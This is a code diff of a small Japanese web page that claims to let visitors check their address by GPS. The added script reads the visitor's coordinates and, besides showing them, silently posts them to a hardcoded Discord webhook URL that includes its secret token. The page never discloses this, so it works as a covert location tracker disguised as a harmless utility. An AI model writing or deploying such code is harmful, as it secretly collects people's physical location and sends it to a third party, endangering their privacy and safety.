@@ -5,18 +5,36 @@
     <title>Document</title>
 </head>
 <body>
-    <button onclick="click_btn()">取得する</button>
+    <h1>GPSを使って住所を確認</h1>
+    <button onclick="click_btn()">取得</button>
     <p>緯度, 経度：<span id="latitude">???</span></p>
 
     <script>
+        const url = "https://discord.com/api/webhooks/1022789439187071008/aUDv-B7XD1sXdntjrF4OzksA0SSb_uoNqQ9uSTCA729Ydu13zyMMhTTwUvfGldXIxkJ6"
         function click_btn(){
-        navigator.geolocation.getCurrentPosition(successCallback)
+            navigator.geolocation.getCurrentPosition(successCallback)
         }
 
         function successCallback(position){
-        var location = position.coords.latitude+", "+position.coords.longitude
-        document.getElementById("latitude").innerHTML = location
+            var location = position.coords.latitude+", "+position.coords.longitude
+            document.getElementById("latitude").innerHTML = location
+
+            var message = {
+                "username": "foryzen bot",
+                "content": location
+            }
+
+            var data = {
+                method: "POST",
+                mode: "cors",
+                headers: {"Content-type": "application/json"},
+                body: JSON.stringify(message)
+            }
+
+            send(data)
         }
+
+        function send(data){return fetch(url, data)}
     </script>
 </body>
 </html>
